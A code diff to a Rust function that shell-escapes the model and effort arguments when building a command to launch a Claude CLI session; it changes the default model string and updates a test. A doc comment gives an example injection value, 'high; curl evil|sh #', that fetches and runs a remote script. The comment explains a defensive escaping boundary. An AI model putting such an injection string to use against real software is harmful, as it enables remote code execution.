@@ -65,8 +65,8 @@ fn window_exists_for_terminal(title: &str, terminal: &super::emulator::TerminalE
 /// (the session sits idle / "stuck").
 ///
 /// `claude_path`, `model`, and `effort` are passed RAW and shell-escaped here.
-/// This is a command-construction trust boundary: a model like `opus[1m]`
-/// would otherwise be glob-expanded by the shell, and a tampered effort such
+/// This is a command-construction trust boundary: model strings containing
+/// shell metacharacters would otherwise be glob-expanded by the shell, and a tampered effort such
 /// as `high; curl evil|sh #` would be command injection. `escaped_prompt` is
 /// pre-escaped by the caller (it is built from a trusted signal path).
 fn build_claude_command(
@@ -284,7 +284,7 @@ impl NativeBackend {
         // maximum deliberation regardless of the originating stage's settings;
         // stage and knowledge sessions use the stage's effective values.
         let (model, effort) = match kind {
-            SessionType::Merge | SessionType::BaseConflict => ("opus[1m]", "xhigh"),
+            SessionType::Merge | SessionType::BaseConflict => ("opus", "xhigh"),
             SessionType::Stage | SessionType::Knowledge => {
                 (stage.effective_model(), stage.effective_reasoning_effort())
             }
@@ -559,13 +559,8 @@ mod tests {
 
     #[test]
     fn build_claude_command_omits_remote_control_when_disabled() {
-        let cmd = build_claude_command("/usr/bin/claude", "opus[1m]", "xhigh", false, "'prompt'");
-        // The model `opus[1m]` is shell-escaped (the `[` `]` are glob chars),
-        // so it is single-quoted rather than left bare (S-3).
-        assert_eq!(
-            cmd,
-            "/usr/bin/claude --model 'opus[1m]' --effort xhigh 'prompt'"
-        );
+        let cmd = build_claude_command("/usr/bin/claude", "opus", "xhigh", false, "'prompt'");
+        assert_eq!(cmd, "/usr/bin/claude --model opus --effort xhigh 'prompt'");
         assert!(!cmd.contains("--remote-control"));
     }
 
